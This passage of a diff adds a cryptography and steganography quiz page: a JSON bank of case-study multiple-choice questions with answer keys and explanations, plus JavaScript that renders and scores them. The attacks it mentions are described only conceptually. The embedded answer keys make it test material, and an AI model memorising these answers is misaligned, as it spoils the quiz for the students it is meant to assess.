+        "The one-time pad",
+        "Image steganography"
+      ],
+      "answer": 1,
+      "explanation": "The shift or Caesar cipher is a special case of the substitution cipher with a very elegant mathematical description: it simply shifts every plaintext letter by a fixed number of positions in the alphabet."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "A member shifts by 3 positions and can handle most of the alphabet — A becomes d, B becomes e, and so on — but is stuck at the end of the alphabet.",
+      "question": "According to the course, what should X, Y and Z become when shifting by 3?",
+      "options": [
+        "X→a, Y→b, Z→c (the alphabet wraps around)",
+        "X→X, Y→Y, Z→Z (they stay unchanged)",
+        "X→A, Y→B, Z→C (shifted and uppercased)",
+        "The encryption stops at W"
+      ],
+      "answer": 0,
+      "explanation": "The slides explain that the only problem arises towards the end of the alphabet: the shift wraps around, so X becomes a, Y becomes b, and Z is replaced by c."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "A history student must decrypt a Caesar message captured from a Roman-themed game. The game used a shift of 3, and the captured ciphertext reads 'khoor'.",
+      "question": "What is the plaintext?",
+      "options": [
+        "knife",
+        "chool",
+        "lipps",
+        "hello"
+      ],
+      "answer": 3,
+      "explanation": "Shifting each ciphertext letter back by 3: k→h, h→e, o→l, o→l, r→o. The plaintext is 'hello'. (Equivalently, encrypting 'hello' with a shift of 3 — h→k, e→h, l→o, o→r — produces 'khoor'.)"
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "The course's encoding scheme assigns each letter a number: a=0, b=1, c=2, … z=25. A cadet must first convert the word 'ATTACK' into numbers before applying a shift.",
+      "question": "What is the numeric encoding of ATTACK?",
+      "options": [
+        "0, 19, 19, 0, 3, 11",
+        "1, 19, 19, 1, 2, 10",
+        "0, 19, 19, 0, 2, 10",
+        "1, 20, 20, 1, 3, 11"
+      ],
+      "answer": 2,
+      "explanation": "Using a=0 … z=25: A=0, T=19, T=19, A=0, C=2, K=10 — so ATTACK = 0, 19, 19, 0, 2, 10, exactly as in the slide's worked example."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "With the encoding a=0 … z=25, a radio operator encrypts 'ATTACK' using the shift cipher with key k=17: each number gets 17 added (mod 26). A=0 becomes 17 (r); T=19 becomes 10 (k); C=2 becomes 19 (t); K=10 becomes 1 (b).",
+      "question": "What is the full ciphertext of ATTACK with k=17?",
+      "options": [
+        "tbbkrr",
+        "rkkrtb",
+        "btrkkr",
+        "rrkktb"
+      ],
+      "answer": 1,
+      "explanation": "Following the slide: ATTACK = 0,19,19,0,2,10; adding 17 mod 26 gives 17,10,10,17,19,1 which maps to r,k,k,r,t,b — the ciphertext rkkrtb."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "A different unit uses the shift cipher with k=5 to encrypt the word 'CAT' (C=2, A=0, T=19).",
+      "question": "What is the ciphertext of CAT with k=5?",
+      "options": [
+        "hfy",
+        "yhf",
+        "hfe",
+        "cfx"
+      ],
+      "answer": 0,
+      "explanation": "Add 5 to each letter's number, mod 26: C=2→7=h; A=0→5=f; T=19→24=y. The ciphertext is hfy."
+    },
+    {
+      "topic": "Module 1 · Substitution & Caesar (Shift) Ciphers",
+      "case": "An enemy codebreaker has intercepted one ciphertext letter produced by a Caesar cipher with an unknown key. She knows the plaintext letter was 'Y' (number 24) and the ciphertext letter is 'b' (number 1).",
+      "question": "What can she conclude about the key, and what does the course say about Caesar's security overall?",
+      "options": [
+        "The shift is 26 — and the Caesar cipher is unbreakable",
+        "The shift is 1 — and the Caesar cipher is unbreakable",
+        "No key can be deduced from one letter pair",
+        "The shift is 3 (24+3 = 27 ≡ 1 mod 26) — and with only 25 possible keys, the Caesar cipher is far from secure"
+      ],
+      "answer": 3,
+      "explanation": "24 + 3 = 27, and 27 mod 26 = 1, which is 'b' — so the key is 3 (the standard wrap-around at the alphabet's end). The course stresses that with only 25 possible keys, the Caesar cipher is far from secure."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "A national intelligence unit advertises for specialists who can recover plaintexts from ciphertexts and recover keys — the science (and background) of breaking ciphers.",
+      "question": "What is this discipline called?",
+      "options": [
+        "Cryptography",
+        "Authentication",
+        "Cryptanalysis",
+        "Steganography"
+      ],
+      "answer": 2,
+      "explanation": "Cryptanalysis deals with the background of breaking ciphers — the science of recovering the plaintext x from the ciphertext y, and recovering the key k from the ciphertext."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "A young cipher designer argues that his new algorithm is safe only as long as nobody learns how it works, so he keeps the algorithm secret. His examiner fails him, citing a classic principle stated in the course.",
+      "question": "Which principle?",
+      "options": [
+        "A cipher is secure if it is fast",
+        "A cipher should be secure even if the attacker knows the details of the algorithm",
+        "A cipher is secure only while its algorithm is secret",
+        "A cipher should never use keys"
+      ],
+      "answer": 1,
+      "explanation": "It is stressed in the slides that a cipher should be secure even if the attacker knows the details of the algorithm — security must rest on the key, not on the secrecy of the design."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "A cryptanalyst studies a new block cipher and finds a weakness in how its rounds are connected: by exploiting the internal structure of the encryption method itself, she can recover plaintexts faster than trying every key.",
+      "question": "Which category of classical cryptanalysis is this?",
+      "options": [
+        "An analytical attack — it exploits the internal structure of the encryption method",
+        "A brute-force attack — it treats the algorithm as a black box and tests all possible keys",
+        "A social-engineering attack — it involves humans",
+        "An implementation attack — it measures power consumption"
+      ],
+      "answer": 0,
+      "explanation": "Classical cryptanalysis comprises analytical attacks, which exploit the internal structure of the encryption method, and brute-force attacks, which treat the encryption algorithm as a black box and test all possible keys."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "A thief steals an encrypted USB drive containing a message produced by a 40-bit-key cipher. With no idea of the algorithm's internals, he simply runs software that tries every possible key until one produces readable text.",
+      "question": "Which type of attack is this?",
+      "options": [
+        "An analytical attack — the internal structure is exploited",
+        "A side-channel attack — power consumption is measured",
+        "A social-engineering attack — a human is tricked",
+        "A brute-force attack — the algorithm is treated as a black box and all possible keys are tested"
+      ],
+      "answer": 3,
+      "explanation": "Brute-force attacks treat the encryption algorithm as a black box and test all possible keys. The thief ignores the algorithm's structure entirely and simply enumerates keys."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "In a lab exercise, students extract a secret key from a smart card by measuring the electrical power consumption of the card's processor while it operates on the key, and by timing how long each operation takes. They have physical access to the card.",
+      "question": "Which category of cryptanalysis does the course place this in?",
+      "options": [
+        "A social-engineering attack",
+        "A transposition attack",
+        "An implementation attack (side-channel analysis)",
+        "A brute-force attack"
+      ],
+      "answer": 2,
+      "explanation": "Implementation attacks use side-channel analysis: measuring the electrical power consumption of a processor which operates on the secret key, and exploiting the runtime behaviour of algorithms to reveal information about the key. The attacker needs physical access — such as with smart cards."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "A fraudster phones a bank clerk claiming to be from IT: 'We're pushing software updates — we need your password to complete them.' The clerk reads out the password used to protect the branch's cipher keys.",
+      "question": "Which category of attack does the course call this?",
+      "options": [
+        "A brute-force enumeration of keys",
+        "A social-engineering attack — bribing, blackmailing, tricking or classical spying involving humans to obtain a secret key",
+        "An analytical attack on the cipher's structure",
+        "A side-channel attack measuring power"
+      ],
+      "answer": 1,
+      "explanation": "Social-engineering attacks obtain a secret key by involving humans — bribing, blackmailing, tricking or classical spying; the slides even quote the phrasing 'software updates — we need your password'. Malware can also reveal secret keys in software systems."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "A company's key-management policy review lists every way their cryptosystem could fall in the real world. The course groups these into three categories.",
+      "question": "Which list matches the course's overview of cryptanalysis?",
+      "options": [
+        "Classical cryptanalysis (analytical + brute-force), implementation attacks (side-channel), and social-engineering attacks",
+        "Physical, chemical and biological attacks",
+        "Insider, outsider and terrorist attacks",
+        "Active, passive and hybrid attacks"
+      ],
+      "answer": 0,
+      "explanation": "The slides' overview of cryptanalysis covers: classical cryptanalysis (analytical attacks and brute-force attacks), implementation attacks (side-channel analysis with physical access), and social-engineering attacks (bribing, blackmailing, tricking or spying on humans)."
+    },
+    {
+      "topic": "Module 2 · Cryptanalysis: Breaking Ciphers",
+      "case": "An attacker clones a transit smart card and, in his lab, measures its power traces while it encrypts; separately, his partner emails the card's owner a fake 'update' email asking for a PIN. The analytical brute-force team, meanwhile, sits idle because they know neither helps here.",
+      "question": "Which pairing correctly matches each attacker's method to its cryptanalysis category?",
+      "options": [
+        "Power traces → social engineering; fake email → brute force",
+        "Power traces → analytical attack; fake email → implementation attack",
+        "Both are brute-force attacks",
+        "Power traces → implementation (side-channel) attack; fake update email → social-engineering attack"
+      ],
+      "answer": 3,
+      "explanation": "Measuring power consumption of a processor operating on the secret key is side-channel analysis — an implementation attack requiring physical access. Tricking a human into revealing a secret with a fake 'software updates need your password' message is a social-engineering attack."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "A student proposes fixing Caesar's weakness by allowing an ARBITRARY substitution — any letter may map to any other, rather than everyone shifting by the same fixed amount.",
+      "question": "What is such a cipher called, and what does it achieve?",
+      "options": [
+        "A transposition cipher — permutation of the plaintext letters' positions",
+        "A shift cipher — everyone shifts by the same amount",
+        "A monoalphabetic cipher — a dramatic increase in the key space by allowing an arbitrary substitution (a permutation of the alphabet)",
+        "A one-time pad — perfect secrecy through a random key as long as the message"
+      ],
+      "answer": 2,
+      "explanation": "With only 25 possible keys, the Caesar cipher is far from secure. A dramatic increase in the key space can be achieved by allowing an arbitrary substitution — the monoalphabetic cipher, based on a permutation of the alphabet."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "The course defines: a permutation of a finite set of elements S is an ordered sequence of all the elements of S, with each element appearing exactly once. A student must count the permutations of S = {a, b, c}.",
+      "question": "How many permutations does S have, and what are they?",
+      "options": [
+        "Twenty-six",
+        "Six: abc, acb, bac, bca, cab, cba",
+        "Three: abc, bca, cab",
+        "Nine: abc, abd, abe, …"
+      ],
+      "answer": 1,
+      "explanation": "The slides give exactly this example: if S = {a, b, c}, there are six permutations of S: abc, acb, bac, bca, cab, cba (3! = 6)."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "Two teams argue about key spaces. Team A says a monoalphabetic cipher offers barely more keys than Caesar. Team B computes the number of possible alphabet permutations for a 26-letter alphabet.",
+      "question": "Who is right about the size of the monoalphabetic key space?",
+      "options": [
+        "Team B — there are 26! (about 4 × 10²⁶) permutations of the alphabet, a dramatic increase over Caesar's 25 keys",
+        "Team A — there are still only 26 keys",
+        "Team A — there are 26² = 676 keys",
+        "Team B — there are exactly 1,000 keys"
+      ],
+      "answer": 0,
+      "explanation": "Each permutation of the 26-letter alphabet is one possible key, giving 26! ≈ 4 × 10²⁶ keys. The course stresses that allowing an arbitrary substitution achieves a dramatic increase in the key space compared with Caesar's 25."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "A detective intercepts a long monoalphabetic ciphertext. She does not try all permutations; instead she counts how often each cipher symbol appears, matches the most frequent one to 'e', the next to 't', and so on, and soon reads the message.",
+      "question": "According to the course, why do monoalphabetic ciphers fall to this technique?",
+      "options": [
+        "Because their key is only 25 values long",
+        "Because they transpose rather than substitute letters",
+        "Because they use a random key as long as the message",
+        "Because they reflect the frequency data of the original alphabet — the symbols keep the plaintext's letter-frequency profile"
+      ],
+      "answer": 3,
+      "explanation": "The slides state that monoalphabetic ciphers are easy to break because they reflect the frequency data of the original alphabet — frequency analysis exploits exactly this."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "To blunt frequency analysis, a cipher clerk assigns the most common letter, 'e', four different cipher symbols — 16, 74, 35 and 21 — and uses them in rotation or at random when encrypting.",
+      "question": "What is this countermeasure called?",
+      "options": [
+        "A rail fence",
+        "A transposition",
+        "Homophones — multiple substitutes for a single letter",
+        "A one-time pad"
+      ],
+      "answer": 2,
+      "explanation": "The slides give this exact countermeasure: provide multiple substitutes, known as homophones, for a single letter — for example the letter e could be assigned 16, 74, 35 and 21, each used in rotation or randomly, so the ciphertext frequency profile is flattened."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "A military unit adopts a system the course calls unbreakable: the message is represented as a sequence of 0s and 1s (using binary or ASCII), and the key is a random sequence of 0s and 1s of the same length as the message.",
+      "question": "What is this cryptosystem, and what happens to the key after one use?",
+      "options": [
+        "A homophone table — the key rotates through four symbols",
+        "The one-time pad — once a key is used, it is discarded and never used again",
+        "The Caesar cipher — the key is shifted by one each time",
+        "A monoalphabetic cipher — the key is reused daily"
+      ],
+      "answer": 1,
+      "explanation": "The one-time pad cipher represents the message as a sequence of 0s and 1s, uses a random key of 0s and 1s of the same length as the message, and — once a key is used — it is discarded and never used again."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "A cryptographer must explain to a budget committee both faces of the one-time pad: why it is attractive in principle, and why armies do not use it for routine traffic.",
+      "question": "Which pairing matches the course's advantage and disadvantages?",
+      "options": [
+        "Advantage: completely unbreakable for a ciphertext-only attack. Disadvantages: it requires a very long key which is expensive to produce and transmit, and reusing a key is dangerous because any knowledge of the first message would give knowledge of the second",
+        "Advantage: it is free. Disadvantages: it is slow and ugly",
+        "Advantage: short keys. Disadvantages: none",
+        "Advantage: no key needed. Disadvantages: weak against brute force"
+      ],
+      "answer": 0,
+      "explanation": "The slides list the advantage — the encryption method is completely unbreakable for a ciphertext-only attack — and the disadvantages: it requires a very long key which is expensive to produce and transmit, and once a key is used it is dangerous to reuse it for a second message, since any knowledge of the first message would give knowledge of the second."
+    },
+    {
+      "topic": "Module 3 · Monoalphabetic Ciphers & the One-Time Pad",
+      "case": "A lazy cipher clerk reuses a one-time-pad key that was already used for yesterday's message. The enemy has a probable-word guess for yesterday's plaintext, and from the two ciphertexts they reconstruct today's message too.",
+      "question": "Which stated disadvantage of the one-time pad does this blunder illustrate?",
+      "options": [
+        "The key is too short to protect anything",
+        "The pad reflects the frequency of the alphabet",
+        "The pad requires physical access to a smart card",
+        "Once a key is used, it is dangerous to reuse it for a second message — any knowledge on the first message would give knowledge of the second"
+      ],
+      "answer": 3,
+      "explanation": "The slides warn: once a key is used, it is dangerous to reuse it for a second message; any knowledge on the first message would give knowledge of the second. The clerk's reuse handed the enemy exactly that leverage."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A word historian explains that the name of the art of hiding secret data inside ordinary, non-secret files or messages comes from two Greek words: steganos and graphia.",
+      "question": "What do the two Greek roots mean?",
+      "options": [
+        "Steganos means 'secret' and graphia means 'code'",
+        "Steganos means 'key' and graphia means 'lock'",
+        "Steganos means 'covered' and graphia means 'writing'",
+        "Steganos means 'stone' and graphia means 'carving'"
+      ],
+      "answer": 2,
+      "explanation": "The slides note that steganography stems from two Greek words: steganos, meaning covered, and graphia, meaning writing — 'covered writing'."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A suspect sends an ordinary-looking family photo to an accomplice; a secret message is embedded in it, and the accomplice extracts it at the destination. The pair also encrypts the message before embedding it, just to be safe.",
+      "question": "Which technique is being used, and can it be combined with encryption?",
+      "options": [
+        "A side-channel attack — measuring power",
+        "Steganography — hiding secret data within an ordinary, non-secret file or message to avoid detection; it can be combined with encryption as an extra step for hiding or protecting data",
+        "Substitution cipher — replacing each letter with another",
+        "A denial-of-service attack — flooding a server"
+      ],
+      "answer": 1,
+      "explanation": "Steganography is the technique of hiding secret data within an ordinary, non-secret file or message in order to avoid detection; the secret data is then extracted at its destination. The use of steganography can be combined with encryption as an extra step for hiding or protecting data."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "Investigators list the tricks used by a steganography ring: playing an audio track backwards to reveal a message; playing a video at a faster frame rate to reveal a hidden image; embedding a message in an RGB colour channel; and hiding information inside a file header.",
+      "question": "Which of the following is NOT one of the course's examples of steganography?",
+      "options": [
+        "Broadcasting the message on the evening news",
+        "Playing an audio track backwards to reveal a secret message",
+        "Embedding a message in the red, green, or blue channel of an RGB image",
+        "Hiding information within a file header or metadata"
+      ],
+      "answer": 0,
+      "explanation": "The course's examples include: playing an audio track backwards; playing a video at a faster frame rate (FPS) to reveal a hidden image; embedding a message in an RGB image channel; hiding information in a file header or metadata; and embedding via added digital noise. Broadcasting on the news is the opposite of hiding."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A steganography tool's documentation describes its pipeline: a cover file (X) and a secret message (M) are fed as inputs to an encoder; the encoder's function f(X,M,K) embeds the message, and the resulting object looks just like the original cover with no visible changes.",
+      "question": "What is the output of the steganographic encoder called?",
+      "options": [
+        "The cipher text",
+        "The public key",
+        "The digital signature",
+        "The stego object — it looks very similar to the cover file, with no visible changes"
+      ],
+      "answer": 3,
+      "explanation": "Both the cover file (X) and secret message (M) are fed into the steganographic encoder; the function f(X,M,K) embeds the secret message into the cover file, and the resulting stego object looks very similar to the cover file, with no visible changes. To retrieve the message, the stego object is fed into the steganographic decoder."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A steganography course teaches that the technique is classified into five types depending on the nature of one particular thing.",
+      "question": "What determines the five types of steganography?",
+      "options": [
+        "The colour of the user's screen",
+        "The speed of the network link",
+        "The nature of the cover object — the actual object in which the secret data is embedded",
+        "The length of the secret message"
+      ],
+      "answer": 2,
+      "explanation": "Depending on the nature of the cover object (the actual object in which secret data is embedded), steganography is divided into five types: text, image, video, audio, and network steganography."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A textbook chapter on hiding information inside text files lists the technique families used in that medium.",
+      "question": "Which techniques does the course list for text steganography?",
+      "options": [
+        "Slow reads; large file uploads; header hiding",
+        "Format-based method; random and statistical generation; linguistic method",
+        "Least significant bit insertion; masking and filtering; redundant pattern encoding",
+        "Phase coding; spread spectrum; parity encoding"
+      ],
+      "answer": 1,
+      "explanation": "Text steganography — hiding information inside text files — uses the format-based method, random and statistical generation, and the linguistic method. The other options list image-steganography and audio-steganography techniques instead."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A digital-forensics analyst must catalogue the common approaches for hiding data inside images, as listed in the course.",
+      "question": "Which set belongs to image steganography?",
+      "options": [
+        "Least significant bit insertion; masking and filtering; redundant pattern encoding; encrypt and scatter; coding and cosine transformation",
+        "Parity encoding; phase coding; spread spectrum",
+        "Embedding in uncompressed raw video; embedding in the compressed data stream",
+        "Format-based method; linguistic method"
+      ],
+      "answer": 0,
+      "explanation": "The slides list the common approaches to hiding information inside an image as: least significant bit insertion; masking and filtering; redundant pattern encoding; encrypt and scatter; and coding and cosine transformation."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A musician's track is used as a cover: the secret message is embedded into the audio signal in a way that alters the binary sequence of the audio file. The engineer can choose among several methods.",
+      "question": "Which set of methods does the course list for audio steganography?",
+      "options": [
+        "Masking and filtering; cosine transformation",
+        "Linguistic method; format-based method",
+        "Rail fence; homophones; one-time pad",
+        "Least significant bit encoding; parity encoding; phase coding; spread spectrum"
+      ],
+      "answer": 3,
+      "explanation": "In audio steganography the secret message is embedded into an audio signal, altering the binary sequence of the audio file. The listed methods are: least significant bit encoding, parity encoding, phase coding, and spread spectrum."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A film studio's security team hides watermark data in its trailers. The engineer explains there are two main classes of the technique for video covers.",
+      "question": "Which two classes of video steganography does the course give?",
+      "options": [
+        "Hiding data only in the opening credits or only in the closing credits",
+        "Encrypting every frame or deleting every other frame",
+        "Embedding data in uncompressed raw video and compressing it later; and embedding data directly into the compressed data stream",
+        "Playing the video backwards and forwards at once"
+      ],
+      "answer": 2,
+      "explanation": "The two main classes of video steganography are: embedding data in uncompressed raw video and compressing it later, and embedding data directly into the compressed data stream."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A network analyst discovers that two compromised hosts are exfiltrating data by tucking information into rarely-used, optional fields in the headers of ordinary-looking TCP/IP packets — no payload ever looks unusual.",
+      "question": "Which type of steganography is this?",
+      "options": [
+        "Text steganography — the linguistic method",
+        "Network (protocol) steganography — embedding information within network control protocols such as TCP, UDP, ICMP, e.g., hiding data in header fields of a TCP/IP packet that are optional",
+        "Audio steganography — altering an audio signal's binary sequence",
+        "Image steganography — least significant bit insertion"
+      ],
+      "answer": 1,
+      "explanation": "Network steganography (protocol steganography) is the technique of embedding information within network control protocols used in data transmission, such as TCP, UDP and ICMP — for example, hiding information in the header of a TCP/IP packet in fields that are optional."
+    },
+    {
+      "topic": "Module 4 · Steganography: Hidden Writing",
+      "case": "A spy handler abandons an image-steganography channel after it is discovered. His student asks why he won't just keep using it with a new cover photo, given that the data was also encrypted.",
+      "question": "Which drawbacks of steganography does the course list?",
+      "options": [
+        "It requires a lot of overhead to hide relatively few bits of information, and once the system is discovered, it becomes virtually worthless",
+        "It needs a key as long as the message and a quantum computer",
+        "It only works on Windows and only at night",
+        "It always corrupts the cover file beyond repair"
+      ],
+      "answer": 0,
+      "explanation": "The slides list two drawbacks: steganography requires a lot of overhead to hide a relatively few bits of information, and once the system is discovered, it becomes virtually worthless — which is why the handler moved on."
+    },
+    {
+      "topic": "Module 5 · Transposition Techniques & the Rail Fence Cipher",
+      "case": "A cipher student observes that every technique studied so far — substitution, Caesar, monoalphabetic — replaces each plaintext symbol with a ciphertext symbol. Her instructor now shows a fundamentally different mapping: the letters themselves are rearranged.",
+      "question": "What is a cipher that performs some sort of permutation on the plaintext letters called?",
+      "options": [
+        "A substitution cipher",
+        "A one-time pad",
+        "A homophone",
+        "A transposition cipher"
+      ],
+      "answer": 3,
+      "explanation": "All the substitution-based techniques replace a ciphertext symbol for a plaintext symbol. A very different kind of mapping is achieved by performing some sort of permutation on the plaintext letters — this technique is referred to as a transposition cipher."
+    },
+    {
+      "topic": "Module 5 · Transposition Techniques & the Rail Fence Cipher",
+      "case": "The instructor then demonstrates the simplest transposition cipher: the plaintext is written down as a sequence of diagonals and then read off as a sequence of rows.",
+      "question": "Which cipher is this?",
+      "options": [
+        "The one-time pad",
+        "Network steganography",
+        "The rail fence cipher",
+        "The Caesar cipher"
+      ],
+      "answer": 2,
+      "explanation": "The rail fence is the simplest of the transposition ciphers: the plaintext is written down as a sequence of diagonals and then read off as a sequence of rows."
+    },
+    {
+      "topic": "Module 5 · Transposition Techniques & the Rail Fence Cipher",
+      "case": "A signals unit must encrypt the word 'SECURITY' using a rail fence of depth 2: letters in odd positions (1st, 3rd, 5th, 7th) form the top row, letters in even positions form the bottom row, and the ciphertext is read row by row.",
+      "question": "What is the resulting ciphertext?",
+      "options": [
+        "euiys crt",
+        "scrteuiy",
+        "security",
+        "yiuetc r s"
+      ],
+      "answer": 1,
+      "explanation": "S(1) e(2) c(3) u(4) r(5) i(6) t(7) y(8): the top (odd) row is S, c, r, t; the bottom (even) row is e, u, i, y. Reading the rows in order gives scrteuiy — the letters are permuted, not substituted."
+    }
+  ]
+}</script>
+  <script>
+    const modules = JSON.parse(document.getElementById('quiz-data').textContent);
+    const moduleNames = Object.keys(modules);
+    const letters = ['A', 'B', 'C', 'D'];
+    const STORAGE_KEY = 'ebiz_units_mcq_bank_v1';
+    let activeModule = 0;
+    let query = '';
+    let answers = {};
+
+    try {
+      const saved = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+      if (saved && typeof saved === 'object') answers = saved;
+    } catch (e) {}
+
+    function saveState() {
+      try { localStorage.setItem(STORAGE_KEY, JSON.stringify(answers)); } catch (e) {}
+    }
+
+    const tabsEl = document.getElementById('tabs');
+    const questionsEl = document.getElementById('questions');
+    const moduleTitleEl = document.getElementById('moduleTitle');
+    const scoreEl = document.getElementById('score');
+    const answeredLabelEl = document.getElementById('answeredLabel');
+    const percentLabelEl = document.getElementById('percentLabel');
+    const progressBarEl = document.getElementById('progressBar');
+    const searchEl = document.getElementById('search');
+    const resetEl = document.getElementById('reset');
+
+    function key(m, i) { return `${m}:${i}`; }
+
+    function moduleStats(mIdx) {
+      const list = modules[moduleNames[mIdx]];
+      let answered = 0, correct = 0;
+      list.forEach((_, i) => {
+        const st = answers[key(mIdx, i)];
+        if (st) {
+          answered++;
+          if (st.correct) correct++;
+        }
+      });
+      return { answered, correct, total: list.length };
+    }
+
+    function renderTabs() {
+      tabsEl.innerHTML = '';
+      moduleNames.forEach((name, idx) => {
+        const btn = document.createElement('button');
+        btn.type = 'button';
+        btn.className = 'tab' + (idx === activeModule ? ' active' : '');
+        const parts = name.split(' — ');
+        const unitLabel = parts[0] || `Module ${idx + 1}`;
+        const unitTitle = parts[1] || name;
+        const st = moduleStats(idx);
+        const statusText = st.answered > 0 ? ` · ${st.correct}/${st.total}` : ` · ${st.total} questions`;
+        btn.innerHTML = `<span>${escapeHTML(unitTitle)}</span><small>${escapeHTML(unitLabel)}${statusText}</small>`;
+        btn.addEventListener('click', () => {
+          activeModule = idx;
+          query = '';
+          searchEl.value = '';
+          render();
+        });
+        tabsEl.appendChild(btn);
+      });
+    }
+
+    function filteredIndexes() {
+      const list = modules[moduleNames[activeModule]];
+      if (!query.trim()) return list.map((_, i) => i);
+      const needle = query.trim().toLowerCase();
+      return list.map((item, i) => {
+        const haystack = [item.topic || '', item.case || '', item.question, item.explanation, ...item.options].join(' ').toLowerCase();
+        return haystack.includes(needle) ? i : -1;
+      }).filter(i => i >= 0);
+    }
+
+    function makeOptionButton(questionIndex, optionIndex, optionText, state) {
+      const btn = document.createElement('button');
+      btn.type = 'button';
+      btn.className = 'option';
+      btn.innerHTML = `<span class="letter">${letters[optionIndex]}</span><span>${escapeHTML(optionText)}</span>`;
+      if (state) {
+        btn.disabled = true;
+        if (optionIndex === state.selected) {
+          btn.classList.add(state.correct ? 'correct' : 'incorrect');
+        } else if (optionIndex === modules[moduleNames[activeModule]][questionIndex].answer) {
+          btn.classList.add('correct');
+        } else {
+          btn.classList.add('dim');
+        }
+      } else {
+        btn.addEventListener('click', () => selectOption(questionIndex, optionIndex));
+      }
+      return btn;
+    }
+
+    function makeFeedback(item, state, revealed) {
+      const box = document.createElement('div');
+      const show = state || revealed;
+      box.className = 'feedback';
+      if (show) {
+        const correct = state ? state.correct : false;
+        box.classList.add('show', correct ? 'good' : 'bad');
+        const correctText = escapeHTML(item.options[item.answer]);
+        box.innerHTML = `<strong>${correct ? 'Correct!' : 'Correct answer: ' + letters[item.answer] + ' — ' + correctText}</strong><p class="explanation">${escapeHTML(item.explanation)}</p>`;
+      }
+      return box;
+    }
+
+    function makeCard(item, questionIndex) {
+      const state = answers[key(activeModule, questionIndex)];
+      const card = document.createElement('article');
+      card.className = 'card' + (state ? ' answered' : '');
+
+      if (item.topic) {
+        const meta = document.createElement('div');
+        meta.className = 'q-meta';
+        meta.innerHTML = `<span class="topic-pill">${escapeHTML(item.topic)}</span>`;
+        card.appendChild(meta);
+      }
+
+      if (item.case) {
+        const caseBox = document.createElement('div');
+        caseBox.className = 'case-box';
+        caseBox.innerHTML = `<span class="case-label">Case Study</span>${escapeHTML(item.case)}`;
+        card.appendChild(caseBox);
+      }
+
+      const head = document.createElement('div');
+      head.className = 'q-head';
+      const num = document.createElement('div');
+      num.className = 'q-num';
+      num.textContent = questionIndex + 1;
+      const text = document.createElement('h3');
+      text.className = 'q-text';
+      text.textContent = item.question;
+      head.append(num, text);
+
+      const options = document.createElement('div');
+      options.className = 'options';
+      item.options.forEach((opt, optionIndex) => options.appendChild(makeOptionButton(questionIndex, optionIndex, opt, state)));
+
+      const feedback = makeFeedback(item, state, false);
+      feedback.dataset.role = 'feedback';
+
+      card.append(head, options, feedback);
+
+      if (!state) {
+        const actions = document.createElement('div');
+        actions.className = 'card-actions';
+        const reveal = document.createElement('button');
+        reveal.type = 'button';
+        reveal.className = 'show-answer';
+        reveal.textContent = 'Show answer without scoring';
+        reveal.addEventListener('click', () => {
+          const fb = card.querySelector('[data-role="feedback"]');
+          fb.replaceWith(makeFeedback(item, null, true));
+          reveal.remove();
+        });
+        actions.appendChild(reveal);
+        card.appendChild(actions);
+      }
+      return card;
+    }
+
+    function renderQuestions() {
+      questionsEl.innerHTML = '';
+      const list = modules[moduleNames[activeModule]];
+      const indexes = filteredIndexes();
+      if (!indexes.length) {
+        const empty = document.createElement('div');
+        empty.className = 'empty';
+        empty.textContent = 'No matching questions found in this unit module.';
+        questionsEl.appendChild(empty);
+        return;
+      }
+      indexes.forEach(i => questionsEl.appendChild(makeCard(list[i], i)));
+    }
+
+    function updateStats() {
+      const st = moduleStats(activeModule);
+      scoreEl.textContent = `Score: ${st.correct}/${st.total}`;
+      answeredLabelEl.textContent = `${st.answered} of ${st.total} answered`;
+      const pct = st.total ? Math.round((st.answered / st.total) * 100) : 0;
+      percentLabelEl.textContent = `${pct}%`;
+      progressBarEl.style.width = `${pct}%`;
+      renderTabs();
+    }
+
+    function render() {
+      renderTabs();
+      moduleTitleEl.textContent = moduleNames[activeModule];
+      document.title = `${moduleNames[activeModule]} — Electronic Business Security Case-Study Bank`;
+      renderQuestions();
+      updateStats();
+    }
+
+    function selectOption(questionIndex, optionIndex) {
+      const item = modules[moduleNames[activeModule]][questionIndex];
